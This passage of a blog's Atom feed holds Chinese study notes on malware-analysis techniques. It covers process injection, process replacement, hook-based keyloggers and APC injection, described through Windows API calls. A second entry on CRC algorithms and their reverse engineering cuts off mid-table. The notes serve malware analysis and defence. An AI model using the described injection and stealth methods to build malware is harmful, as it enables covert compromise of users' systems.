<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>K&#39;s House</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://kabeor.github.io/"/>
  <updated>2018-08-18T03:13:55.768Z</updated>
  <id>https://kabeor.github.io/</id>
  
  <author>
    <name>kabeor</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>第12章  隐蔽的恶意代码启动</title>
    <link href="https://kabeor.github.io/%E7%AC%AC12%E7%AB%A0%20%20%E9%9A%90%E8%94%BD%E7%9A%84%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%90%AF%E5%8A%A8/"/>
    <id>https://kabeor.github.io/第12章  隐蔽的恶意代码启动/</id>
    <published>2018-08-18T02:09:07.280Z</published>
    <updated>2018-08-18T03:13:55.768Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第12章-隐蔽的恶意代码启动"><a href="#第12章-隐蔽的恶意代码启动" class="headerlink" title="第12章  隐蔽的恶意代码启动"></a>第12章  隐蔽的恶意代码启动</h1><h2 id="12x1-启动器（Launcher）"><a href="#12x1-启动器（Launcher）" class="headerlink" title="12x1 启动器（Launcher）"></a>12x1 启动器（Launcher）</h2><p>启动器（也称为加载器）是一种设置自身或其他恶意代码片段以达到即时或将来秘密运行的恶意代码。启动器的目的是安装一些东西，以使恶意行为对用户隐藏。</p><p>启动器经常包含它要加载的恶意代码。最常见的情况是在它的资源节中包含一个可执行文件或者DLL。正常情况下，Windows PE文件格式中的资源节是供可执行程序使用的，但并不应该是可执行程序的组成代码。正常资源节的内容包括图标、图片、菜单以及字符串。启动器通常在资源节存储恶意代码，当启动器运行时，它在运行嵌入的可执行程序或者DLL程序之前，从资源节将恶意代码提取出来。</p><p>恶意代码启动器通常需要以管理员权限运行，或者通过提权拥有这些权限。普通的用户进程不能执行本章讨论的技术。事实上，启动器可能会包含一些提权代码，这提供了识别启动器的另一种方法。</p><h2 id="12x2-进程注入"><a href="#12x2-进程注入" class="headerlink" title="12x2 进程注入"></a>12x2 进程注入</h2><p>隐藏启动的最流行技术是进程注入。顾名思义，这种技术是将代码注入到另外一个正在运行的进程中，而被注入的进程会不知不觉地运行注入的代码。恶意代码编写者试图通过进程注入技术隐藏代码的行为，有时他们也试图使用这种技术绕过基于主机的防火墙和那些针对进程的安全机制。</p><p>VirtualAllocEx函数用来在另外一个进程中分配一块内存空间。WriteProcessMemory函数用来向VirtualAllocEx函数分配的地址空间写数据。</p><h3 id="1-DLL注入"><a href="#1-DLL注入" class="headerlink" title="1. DLL注入"></a>1. DLL注入</h3><p>DLL注入将代码注入到一个远程进程，并让远程进程调用LoadLibrary，从而强制远程进程加载一个DLL程序到它的进程上下文。一旦被感染的进程加载了恶意DLL程序，OS会自动地调用DLLMain函数，DLLMain函数由这个DLL程序的作者编写。这个函数包含的代码拥有与被注入进程访问系统的相同权限。通常情况下，恶意DLL程序除了DLLMain函数之外，拥有很少的内容，并且它所做的任何操作看起来似乎都来自于被感染的进程。</p><p>为了将恶意DLL注入到一个主机进程，启动器恶意代码必须获取受害进程的句柄。最常用的方法是使用Windows API函数CreateToolhelp32Snapshot、Process32First和Process32Next，来查找进程列表中的目标进程。一旦发现目标进程，启动器会提取目标进程的进程标识（PID），然后用提取的PID调用OpenProcess，以获取目标进程的句柄。</p><p>DLL注入使用CreateRemoteThread函数，这个函数可以让启动器恶意代码在远程进程中创建并运行一个新的线程。使用CreateRemoteThread时，需要传入三个比较重要的参数：OpenProcess函数获得的进程句柄（hProcess），注入线程的入口点（lpStartAddress）以及线程的参数（hpParameter）。例如，线程的入口点可能被设置为Loadlibrary函数的地址，并且恶意DLL名字作为它的参数。这会触发受害进程用恶意DLL名字作为参数调用LoadLibrary，因此恶意DLL就可以加载到受害进程中（假设LoadLibrary函数在受害进程的内存空间中有效，并且恶意DLL的名字字符串存在于同一个进程空间）。</p><p>恶意代码编写者通常使用函数VirtualAllocEx，为恶意动态库的名字字符串创建内存空间。如果提供远程进程的句柄，VirtualAllocEx函数将在远程进程中分配内存空间。</p><p>调用CreateRemoteThread之前，调用的最后一个函数是WriteProcessMemory。这个函数将恶意DLL程序的名字字符串写入到VirtualAllocEx分配的内存空间中。</p><h3 id="2-直接注入"><a href="#2-直接注入" class="headerlink" title="2. 直接注入"></a>2. 直接注入</h3><p>同DLL注入一样，直接注入也涉及在远程进程的内存空间中分配和插入代码。直接注入同DLL注入类似，它们都使用了许多相同的WindowsAPI函数。不同的是，它并不用单独编写一个DLL并且强制远程进程载入它，而是直接将恶意代码注入到远程进程中。</p><p>直接注入比DLL注入更加灵活，但是要想注入的代码在不对宿主进程产生副作用的前提下成功运行，直接注入需要大量的定制代码。这种技术可以被用来注入编译过的代码，但更多的时候，它用来注入shellcode.</p><p>直接注入比DLL注入更加灵活，但是要想注入的代码在不对宿主进程产生副作用的前提下成功运行，直接注入需要大量的定制代码。这种技术可以被用来注入编译过的代码，但更多的时候，它用来注入shellcode.</p><p>在应用直接注入技术的恶意代码中，经常会发现如下三个函数：VirtualAllocEx、writeProcessMenory和CreateRemoteThread。通常会有两次virtualAllocEx和WriteProcessMemory调用。第一次调用是分配内存空间并写入远程线程使用的数据。第二次调用分配内存空间并且写入远程线程代码。CreateRemoteThread调用包含远程线程代码的位置（lpStartAddress）和数据（lpParameter）。</p><p>由于远程线程使用的数据和函数都必须位于受害进程空间内，所以正常编译的程序都无法工作。例如，字符串不在正常的.data段中，需要调用函数LoadLibrary/GetProcAddress来访问未载入的函数。另外，还有一些其他的限制，但我们在这里不做深入探究。基本上，直接注入技术要求恶意代码编写者或者精通汇编语言代码，或者是仅仅注入相对简单的shellcode。</p><p>要分析远程线程的代码，你可能需要调试恶意代码，并且在反汇编器中，转储WriteprocessMemory调用发生前所有的内存缓存区，以便进行分析。由于这些缓存区经常包含shellcode，因此你需要掌握shellcode分析技巧.</p><h2 id="12x3-进程替换"><a href="#12x3-进程替换" class="headerlink" title="12x3 进程替换"></a>12x3 进程替换</h2><p>除了注入代码到一个宿主程序外，一些恶意代码还会使用一种被称为进程替换方法，将一个可执行文件重写到一个运行进程的内存空间。当恶意代码编写者想要将恶意代码伪装成一个合法进程，并且不会产生DLL注入让进程崩溃的危险时，他们会使用进程替换技术。</p><p>这种技术让恶意代码与被替换进程拥有相同的特权级。例如，如果一段恶意代码执行了一次针对进程svchost.exe的进程替换攻击，用户会看到一个名为svchost.exe的进程从C:Windows\System32目录中启动，并很可能认为它没有什么风险（这是一种常见的恶意代码攻击方式）。</p><p>进程替换的关键是以挂起状态创建一个进程。这也就意味着这个进程将会被载入内存，但是它的主线程被挂起。在外部的程序恢复主线程之前，这个程序将不做任何事情，恢复主线程后，才开始执行。</p><p>一旦进程被创建，接下来就要用恶意的可执行文件替换受害进程的内存空间，通常会使用函数ZwUnmapViewofSection来释放由参数指向的所有内存。解除内存映射之后，加载器通常执行函数VirtualAllocEx为恶意代码分配新的内存，并且用函数WriteProcessMemory将恶意代码的每个段写入到受害进程的内存空间，这些操作常在一个循环中进行。</p><p>最后一步，恶意代码恢复受害进程的环境，通过调用SetThreadContext函数，让入口点指向恶意的代码，让其获得运行。最后，调用ResumeThread函数，初始化恶意代码并进行执行，而此时它已经替换了受害进程。</p><p>进程替换是恶意代码伪装成非恶意程序的一种有效方法。通过伪装成受害进程，恶意代码可以绕过防火墙和入侵防御系统（IPS），并且使它看起来像正常的Windows进程，从而让它逃避探测。</p><p>此外，通过使用原始的二进制路径，恶意代码还可以欺骗精明的用户，当查看进程列表时，他们只能看到执行是已知、有效的二进制程序，而并不会意识到它已经被解除了映射，并被替换成了恶意程序。</p><h2 id="12x4-钩子-Hook-注入"><a href="#12x4-钩子-Hook-注入" class="headerlink" title="12x4 钩子(Hook)注入"></a>12x4 钩子(Hook)注入</h2><p>钩子注入是一种利用Windows钩子（Hook）加载恶意代码的方法，恶意代码用它拦截发往某个应用程序的消息。恶意代码编写者可以用挂钩注入，来完成以下两种事情。</p><ol><li>保证无论何时拦截到一个特殊消息，恶意代码都会被运行。</li><li>保证一个特殊的DLL被载入到受害进程的内存空间。</li></ol><h3 id="1-本地和远程钩子（Hook）"><a href="#1-本地和远程钩子（Hook）" class="headerlink" title="1. 本地和远程钩子（Hook）"></a>1. 本地和远程钩子（Hook）</h3><p>有两种类型的Windows钩子：</p><ol><li>本地钩子被用来观察和操纵发往进程内部的消息。</li><li>远程钩子被用来观察和操纵发往一个远程进程的消息（系统中的另一个进程）。</li></ol><p>远程钩子有两种形式：上层和底层。上层的远程挂钩要求钩子例程是DLL程序的一个导出函数。它被操作系统映射到被挂钩线程或者系统所有线程的进程地址空间。底层远程钩子则要求钩子例程被保护在安装钩子的进程中。这个例程在操作系统获得处理事件的机会前被通知。</p><h3 id="2-使用钩子的击键记录器"><a href="#2-使用钩子的击键记录器" class="headerlink" title="2. 使用钩子的击键记录器"></a>2. 使用钩子的击键记录器</h3><p>钩子注入常被一种叫做击键记录器的恶意程序所使用，被用来记录击键。击键可以分别使用WH_KEYBOARD和WH_KEYBOARD_LL钩子例程类型，来注册上层和底层的钩子。</p><p>对于WH_KEYBOARD例程，钩子通常运行在远程进程的上下文空间中，也可以运行在安装钩子的进程空间中。对于WH_KEYBOARD_LL例程，事件直接发送到安装钩子的进程，所以钩子运行在创建钩子的进程中。无论使用哪种钩子类型，击键记录器都可以截获击键，并且在传递到进程或者系统之前，把它们记录到文件或是修改。</p><h3 id="3-使用SetWindowsHookEx"><a href="#3-使用SetWindowsHookEx" class="headerlink" title="3. 使用SetWindowsHookEx"></a>3. 使用SetWindowsHookEx</h3><p>用来执行远程Windows挂钩的主要函数是SetwindowsHookEx，它拥有如下参数：</p><ol><li>idHook 指定要安装的钩子例程的类型。</li><li>lpfn钩子例程指针。</li><li>hMod对于上层的钩子，它来标识包含lpfn定义的钩子例程的DLL句柄。对于底层钩子，它来标识包含1pfn例程的本地模块句柄。</li><li>dwThreadId 指定与钩子例程关联的线程标识，如果这个参数为0，则挂钩例程将绑定与调用线程同在一个桌面的所有线程。当为底层钩子时必须被设置为0。</li></ol><p>钩子例程可以包含处理消息（当它们从系统产生后）的代码，也可以什么也不做。无论如何，钩子例程都必须调用CallNextHookEx，这可以保证调用链中下一个钩子例程能够得到消息，并且保证系统继续正常运行。</p><h3 id="4-目标线程"><a href="#4-目标线程" class="headerlink" title="4. 目标线程"></a>4. 目标线程</h3><p>当制定dwThreadId时，恶意代码通常决定载入到dw某个系统线程，或者载入到所有线程。也就是说，仅当它是击键记录器或者类似的程序时，恶意代码才载入到所有线程（目的是拦截消息）。然而，载入到所有的线程会降低系统的运行速度，并且可能触发入侵防护系统。因此，如果是简单载入一个DLL到远程进程，则注入单个线程会保持恶意代码的隐蔽性。</p><p>指定单线程为目标，要求查找进程列表中的目标进程，如果碰到目标进程没有运行，恶意代码要先启动它。如果一个恶意的应用程序挂钩了一个经常使用的Windows消息，它很有可能会触发入侵防御系统，所以恶意代码通常会挂钩一个不常使用的消息，如WH_CBT（一个用于计算机训练的消息）。</p><h2 id="12x5-Detours"><a href="#12x5-Detours" class="headerlink" title="12x5 Detours"></a>12x5 Detours</h2><p>Detours是微软研究院1999年开发的一个代码库。它的初衷是作为一个来扩展已有操作系统和应用程序功能的简单工具。Detours开发库让开发人员对二进制应用程序进行修改变得简单可行。</p><p>同样，恶意代码编写者也喜欢Detours库，他们使用Detours库执行对导入表的修改，挂载DLL到已有程序文件，并且向运行的进程添加函数钩子等。</p><p>恶意代码编写者最常使用Detours库，来添加一个新的DLL到硬盘上的二进制文件。恶意代码修改PE结构，并且创建一个名为.detour的段，它通常位于导出表和调试符号之间。.detour段在新的导入地址表中包含了原始的PE头部。使用Detours库提供的setdll工具，恶意代码编写者修改PE头部，使其指向新的导入表。</p><h2 id="12x6-APC注入"><a href="#12x6-APC注入" class="headerlink" title="12x6 APC注入"></a>12x6 APC注入</h2><p>在本章的前面，我们看到通过CreateRemoteThread函数创建一个线程就可以使用远程进程中的一个函数。然而，线程创建需要系统开销，所以调用一个现有的线程会更加高效。Windows的异步过程调用（APC）可以满足这种要求。</p><p>APC可以让一个线程在它正常的执行路径运行之前执行一些其他的代码。每一个线程都有一个附加的APC队列，它们在线程处于可警告的等待状态时被处理。例如它们调用如WaitForSingleObjectEx、waitForMultipleobjectsEx和SleepEx函数等。实质上，这些函数给了线程一个处理等待APC的机会。</p><p>如果应用程序在线程可警告等待状态时（未运行之前）排入一个APC队列，那么线程将从调用APC函数开始。线程逐个调用APC队列中的所有APC。当APC队列完成时，线程才继续沿着它规定的路径执行。恶意代码编写者为了让他们的代码立即获得执行，他们用APC抢占可警告等待状态的线程。</p><p>APC有两种存在形式：</p><ol><li>为系统或者驱动生成的APC，被称为内核模式APC。</li><li>为应用程序生成的APC，被称为用户模式APC。<br>恶意代码可以使用APC注入技术，让内核空间或者用户空间中生成用户模式的APC.</li></ol><h3 id="1-用户模式下APC注入"><a href="#1-用户模式下APC注入" class="headerlink" title="1. 用户模式下APC注入"></a>1. 用户模式下APC注入</h3><p>线程可以使用API函数QueueUserAPC排入一个让远程线程调用的函数。运行用户模式的APC要求线程必须处于可警告等待状态，因此恶意代码会查看进程中是否有可能进入这个状态的目标线程。幸运的是，对恶意代码分析师来说，WaitForSingleObjectEx是最常使用的Windows API调用，并且有很多处于可警告等待状态的线程。</p><p>让我们来检查一下QueueUserAPC的参数：pfnAPC、hThread以及dwData。QueueUserAPC要求句柄为hThread的线程使用参数dwData运行pfnAPC定义的函数。</p><blockquote><p>注意：分析过程中，你可以通过查找恶意代码查询目标进程的API调用，如Create Toolhelp32Snapshot、Process32First和Process32Next 来发现目标线程的代码。在这些代码之后的经常是Thread32First和Thread32Next调用，它们通常被包含在一个在目标进程中查找目标线程的循环中。另外，恶意代码也会利用参数SYSTEM_PROCESS_INFORMATION调用Nt/ZwQuerySystemlnformation来发现目标进程。</p></blockquote><h3 id="2-内核模式的APC注入"><a href="#2-内核模式的APC注入" class="headerlink" title="2. 内核模式的APC注入"></a>2. 内核模式的APC注入</h3><p>恶意代码驱动和Rootkit也常常希望在用户空间中执行代码，但是对它们来说这样做并不容易。一种方法是在内核空间执行APC注入。恶意的驱动可创建一个APC，然后分配用户模式进程中的一个线程（最常见的是suchost.exe）运行它。这种类型APC通常由shellcode组成。</p><p>设备驱动利用两个主要的函数来使用APC: KeInitializeApc和KeInsertQueueApc.</p><p>From <a href="https://kabeor.github.io/第12章  隐蔽的恶意代码启动/">https://kabeor.github.io/第12章  隐蔽的恶意代码启动/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;第12章-隐蔽的恶意代码启动&quot;&gt;&lt;a href=&quot;#第12章-隐蔽的恶意代码启动&quot; class=&quot;headerlink&quot; title=&quot;第12章  隐蔽的恶意代码启动&quot;&gt;&lt;/a&gt;第12章  隐蔽的恶意代码启动&lt;/h1&gt;&lt;h2 id=&quot;12x1-启动器（Launch
      
    
    </summary>
    
      <category term="病毒分析" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
      <category term="《恶意代码分析实战》笔记" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/%E3%80%8A%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E3%80%8B%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="病毒分析" scheme="https://kabeor.github.io/tags/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>CRC校验算法及逆向方法初探</title>
    <link href="https://kabeor.github.io/CRC%E6%A0%A1%E9%AA%8C%E7%AE%97%E6%B3%95%E5%8F%8A%E9%80%86%E5%90%91%E6%96%B9%E6%B3%95%E5%88%9D%E6%8E%A2/"/>
    <id>https://kabeor.github.io/CRC校验算法及逆向方法初探/</id>
    <published>2018-08-16T07:13:30.658Z</published>
    <updated>2018-08-17T07:13:31.452Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CRC校验算法及逆向方法初探"><a href="#CRC校验算法及逆向方法初探" class="headerlink" title="CRC校验算法及逆向方法初探"></a>CRC校验算法及逆向方法初探</h1><h2 id="循环冗余校验（Cyclic-redundancy-check）介绍"><a href="#循环冗余校验（Cyclic-redundancy-check）介绍" class="headerlink" title="循环冗余校验（Cyclic redundancy check）介绍"></a>循环冗余校验（Cyclic redundancy check）介绍</h2><blockquote><p>循环冗余校验（英语：Cyclic redundancy check，通称“CRC”）是一种根据网络数据包或计算机文件等数据产生简短固定位数校验码的一种散列函数，主要用来检测或校验数据传输或者保存后可能出现的错误。生成的数字在传输或者存储之前计算出来并且附加到数据后面，然后接收方进行检验确定数据是否发生变化。   –维基百科(<a href="https://zh.wikipedia.org/wiki/%E5%BE%AA%E7%92%B0%E5%86%97%E9%A4%98%E6%A0%A1%E9%A9%97" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki/%E5%BE%AA%E7%92%B0%E5%86%97%E9%A4%98%E6%A0%A1%E9%A9%97</a>)</p></blockquote><h2 id="CRC校验计算步骤"><a href="#CRC校验计算步骤" class="headerlink" title="CRC校验计算步骤"></a><strong>CRC校验计算步骤</strong></h2><ol><li>选择一个生成多项式G(x)。</li><li>假设该生成多项式G(x)的二进制数有k位，在发送的数据帧B(x)(设为m位)后加k-1个0，得到新二进制串H(x)，H(x)位数应该为m+k-1。</li><li>H(x)“模2除法”除以G(x)，所得到的余数(记为F(x))就是原数据帧的CRC校验码，又称FCS(帧校验序列)。注意，F(x)的位数只能比G(x)少一位，0不能省略。</li><li>将F(x)附加到B(x)后面，组成新帧N(x),然后发送到接收端。</li><li>接收端将N(x)以“模2除法”除以G(x)，如果没有余数，则表明没有出错(因为在发送端发送数据帧之前就已附加了一个数,做了去余处理(也就已经能整除了),所以结果应该没有余数。如果有余数,则表明该帧在传输过程中出现了差错)。</li></ol><p>来看一些关键点</p><blockquote><ol><li><strong>生成多项式</strong></li></ol></blockquote><p>当进行CRC检验时，发送方与接收方需要事先约定一个除数，即生成多项式，一般记作G(x)。生成多项式的最高位与最低位必须是1。</p><p>常见CRC标准如下</p><p><img src="https://i.loli.net/2018/08/16/5b751c8007704.jpg" alt=""></p><p>逆向中常见的是<br>CRC16  ：<img src="https://i.loli.net/2018/08/16/5b751d408104c.jpg" alt=""><br>CRC32  ：<img src="https://i.loli.net/2018/08/16/5b751d71c13bd.jpg" alt=""></p><p>生成多项式中幂代表在二进制串中该位为1，注意1是x的0次方，二进制串第一位的幂是0</p><p>因此CRC16的二进制串转换为HEX为 <code>0x1 1021</code> ，<br>CRC32 HEX为 <code>0x1 04C11DB7</code>(另一个CRC32:     <code>1 1110 1101 1011 1000 1000 0011 0010 0000 = 0x1 EDB8 8320</code>)。<strong>计算CRC X，就取后X位，如CRC16取后16位，则0x1 1021变为0x1021</strong>。</p><p>这些数值也可以在逆向过程中作为特征，让我们快速识别算法，至于魔改大多数也是从这些数值下手，后面会详细说。</p><blockquote><ol><li><strong>模2除法</strong></li></ol></blockquote><p>模2除法与算术除法类似,但它既不向上位借位也不比较除数和被除数的相同位数值的大小,只以相同位数进行相除。</p><p>模2加法运算为:1+1=0,0+1=1,0+0=0,无进位,也无借位。<br>模2减法运算为:1-1=0,0-1=1,1-0=1,0-0=0,也无进位,无借位。</p><p><img src="https://i.loli.net/2018/08/16/5b7580db445d3.jpg" alt=""></p><blockquote><p>过程图示</p></blockquote><p><img src="https://i.loli.net/2018/08/16/5b758077e370f.jpg" alt=""></p><h2 id="CRC16校验C-实现"><a href="#CRC16校验C-实现" class="headerlink" title="CRC16校验C++实现"></a>CRC16校验C++实现</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    unsigned int crc = &apos;a&apos;;//计算字符a的crc16校验码</span><br><span class="line">    //右移8位，和手动计算一样，左移相当于补0，这里相当于直接补了8个0，开始计算。</span><br><span class="line">    crc &lt;&lt;= 8; //&lt;&lt;= 相当余 crc=crc&lt;&lt;8;</span><br><span class="line">    //计算8次。</span><br><span class="line">    for (int i = 0; i &lt; 8; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        //如果最高位是1的话需要计算，如果不是直接左移。（左移的操作可以想象成补0)</span><br><span class="line">        if ((crc &amp; 0x8000) != 0)</span><br><span class="line">        &#123;</span><br><span class="line">            crc &lt;&lt;= 1;</span><br><span class="line">            crc = crc ^ 0x1021;//这个说明用的是 CRC16   x16+x12+x5+1.</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            crc &lt;&lt;= 1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    //取后16位，如果用的是crc使用的是unsigned short 就不需要这一步了。</span><br><span class="line">    crc = crc &amp; 0xffff;</span><br><span class="line">    //输出。</span><br><span class="line">    std::cout &lt;&lt; crc &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="CRC32生成表算法C实现"><a href="#CRC32生成表算法C实现" class="headerlink" title="CRC32生成表算法C实现"></a>CRC32生成表算法C实现</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">static uint32_t table[256];</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">//位逆转</span><br><span class="line">static uint32_t bitrev(uint32_t input, int bw)</span><br><span class="line">&#123;</span><br><span class="line">    int i;</span><br><span class="line">    uint32_t var;</span><br><span class="line">    var = 0;</span><br><span class="line">    for(i=0; i&lt;bw; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        if(input &amp; 0x01)</span><br><span class="line">        &#123;</span><br><span class="line">            var |= 1&lt;&lt;(bw - 1 - i);</span><br><span class="line">        &#125;</span><br><span class="line">        input &gt;&gt;= 1;</span><br><span class="line">    &#125;</span><br><span class="line">    return var;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">//码表生成</span><br><span class="line">void crc32_init(uint32_t poly)</span><br><span class="line">&#123;</span><br><span class="line">    int i;</span><br><span class="line">    int j;</span><br><span class="line">    uint32_t c;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    poly = bitrev(poly, 32);</span><br><span class="line">    for(i=0; i&lt;256; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        c = i;</span><br><span class="line">        for (j=0; j&lt;8; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            c = (c &amp; 1) ? (poly ^ (c &gt;&gt; 1)) : (c &gt;&gt; 1);</span><br><span class="line">        &#125;</span><br><span class="line">        table[i] = c;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">//计算CRC</span><br><span class="line">uint32_t crc32(uint32_t crc, void* input, int len)</span><br><span class="line">&#123;</span><br><span class="line">    int i;</span><br><span class="line">    uint8_t index;</span><br><span class="line">    uint8_t *p;</span><br><span class="line">    p = (uint8_t*)input;</span><br><span class="line">    for(i=0; i&lt;len; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        index = (*p ^ crc);</span><br><span class="line">        crc = (crc &gt;&gt; 8) ^ table[index];</span><br><span class="line">        p++;</span><br><span class="line">    &#125;</span><br><span class="line">    return crc;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">//测试用例</span><br><span class="line">void main(void)</span><br><span class="line">&#123;</span><br><span class="line">    uint32_t crc;</span><br><span class="line">    crc32_init(0x4C11DB7);</span><br><span class="line">    crc = crc32(0xFFFFFFFF, &quot;1234567890&quot;, 10);</span><br><span class="line">    printf(&quot;CRC32 = 0x%08X\n&quot;, crc ^ 0xFFFFFFFF);</span><br><span class="line">    system(&quot;pause&quot;);</span><br></pre></td></tr></table></figure><h2 id="CRC查表法"><a href="#CRC查表法" class="headerlink" title="CRC查表法"></a>CRC查表法</h2><p>查表法是将移位异或的计算结果做成了一个表，就是将0~256放入一个长度为16位的寄存器中的低八位，高八位填充0，然后将该寄存器与生成多项式按照把CRC寄存器的内容右移一位（朝低位）用0填补最高位，并检查右移后的移出位；如果移出位为0：再次右移一位；如果移出位为1，CRC寄存器与多项式进行异或，直到八位全部移出，最后寄存器中的值就是表格中的数据，高八位、低八位分别单独一个表。</p><p>CRC32数据表生成<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int make_crc32_table()  </span><br><span class="line">&#123;  </span><br><span class="line">    unsigned c;  </span><br><span class="line">    int i = 0;  </span><br><span class="line">    int bit = 0;  </span><br><span class="line">    for(i = 0; i &lt; 256; i++)  </span><br><span class="line">    &#123;  </span><br><span class="line">        c  = (unsigned)i;      </span><br><span class="line">        for(bit = 0; bit &lt; 8; bit++)  </span><br><span class="line">        &#123;  </span><br><span class="line">            if(c&amp;1)  </span><br><span class="line">            &#123;  </span><br><span class="line">                c = (c &gt;&gt; 1)^(0xEDB88320);  //生成多项式，如果动态生成这张CRC32表，则必定会有这个数</span><br><span class="line">                 </span><br><span class="line">            &#125;  </span><br><span class="line">            else </span><br><span class="line">            &#123;  </span><br><span class="line">                c =  c &gt;&gt; 1;  </span><br><span class="line">            &#125;     </span><br><span class="line">        &#125;  </span><br><span class="line">        crc32_table = c; </span><br><span class="line">    &#125;        </span><br><span class="line">&#125;  //这个算法，会产生包含有256个元素的CRC32表</span><br></pre></td></tr></table></figure></p><p>逆向时若是动态生成表，则应留意生成多项式，若是静态表，则会在数据段留下整个表</p><p>常用表如下<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CRC-16 Table</span><br><span class="line"></span><br><span class="line">  00h   0000 C0C1 C181 0140 C301 03C0 0280 C241</span><br><span class="line">  08h   C601 06C0 0780 C741 0500 C5C1 C481 0440</span><br><span class="line">  10h   CC01 0CC0 0D80 CD41 0F00 CFC1 CE81 0E40</span><br><span class="line">  18h   0A00 CAC1 CB81 0B40 C901 09C0 0880 C841</span><br><span class="line"></span><br><span class="line">  20h   D801 18C0 1980 D941 1B00 DBC1 DA81 1A40</span><br><span class="line">  28h   1E00 DEC1 DF81 1F40 DD01 1DC0 1C80 DC41</span><br><span class="line">  30h   1400 D4C1 D581 1540 D701 17C0 1680 D641</span><br><span class="line">  38h   D201 12C0 1380 D341 1100 D1C1 D081 1040</span><br><span class="line"></span><br><span class="line">  40h   F001 30C0 3180 F141 3300 F3C1 F281 3240</span><br><span class="line">  48h   3600 F6C1 F781 3740 F501 35C0 3480 F441</span><br><span class="line">  50h   3C00 FCC1 FD81 3D40 FF01 3FC0 3E80 FE41</span><br><span class="line">  58h   FA01 3AC0 3B80 FB41 3900 F9C1 F881 3840</span><br><span class="line"></span><br><span class="line">  60h   2800 E8C1 E981 2940 EB01 2BC0 2A80 EA41</span><br><span class="line">  68h   EE01 2EC0 2F80 EF41 2D00 EDC1 EC81 2C40</span><br><span class="line">  70h   E401 24C0 2580 E541 2700 E7C1 E681 2640</span><br><span class="line">  78h   2200 E2C1 E381 2340 E101 21C0 2080 E041</span><br><span class="line"></span><br><span class="line">  80h   A001 60C0 6180 A141 6300 A3C1 A281 6240</span><br><span class="line">  88h   6600 A6C1 A781 6740 A501 65C0 6480 A441</span><br><span class="line">  90h   6C00 ACC1 AD81 6D40 AF01 6FC0 6E80 AE41</span><br><span class="line">  98h   AA01 6AC0 6B80 AB41 6900 A9C1 A881 6840</span><br><span class="line"></span><br><span class="line">  A0h   7800 B8C1 B981 7940 BB01 7BC0 7A80 BA41</span><br><span class="line">  A8h   BE01 7EC0 7F80 BF41 7D00 BDC1 BC81 7C40</span><br><span class="line">  B0h   B401 74C0 7580 B541 7700 B7C1 B681 7640</span><br><span class="line">  B8h   7200 B2C1 B381 7340 B101 71C0 7080 B041</span><br><span class="line"></span><br><span class="line">  C0h   5000 90C1 9181 5140 9301 53C0 5280 9241</span><br><span class="line">  C8h   9601 56C0 5780 9741 5500 95C1 9481 5440</span><br><span class="line">  D0h   9C01 5CC0 5D80 9D41 5F00 9FC1 9E81 5E40</span><br><span class="line">  D8h   5A00 9AC1 9B81 5B40 9901 59C0 5880 9841</span><br><span class="line"></span><br><span class="line">  E0h   8801 48C0 4980 8941 4B00 8BC1 8A81 4A40</span><br><span class="line">  E8h   4E00 8EC1 8F81 4F40 8D01 4DC0 4C80 8C41</span><br><span class="line">  F0h   4400 84C1 8581 4540 8701 47C0 4680 8641</span><br><span class="line">  F8h   8201 42C0 4380 8341 4100 81C1 8081 4040</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CRC-32 Table</span><br><span class="line"></span><br><span class="line">  00h   00000000 77073096 EE0E612C 990951BA</span><br><span class="line">  04h   076DC419 706AF48F E963A535 9E6495A3</span><br><span class="line">  08h   0EDB8832 79DCB8A4 E0D5E91E 97D2D988</span><br><span class="line">  0Ch   09B64C2B 7EB17CBD E7B82D07 90BF1D91</span><br><span class="line"></span><br><span class="line">  10h   1DB71064 6AB020F2 F3B97148 84BE41DE</span><br><span class="line">  14h   1ADAD47D 6DDDE4EB F4D4B551 83D385C7</span><br><span class="line">  18h   136C9856 646BA8C0 FD62F97A 8A65C9EC</span><br><span class="line">  1Ch   14015C4F 63066CD9 FA0F3D63 8D080DF5</span><br><span class="line"></span><br><span class="line">  20h   3B6E20C8 4C69105E D56041E4 A2677172</span><br><span class="line">  24h   3C03E4D1 4B04D447 D20D85FD A50AB56B</span><br><span 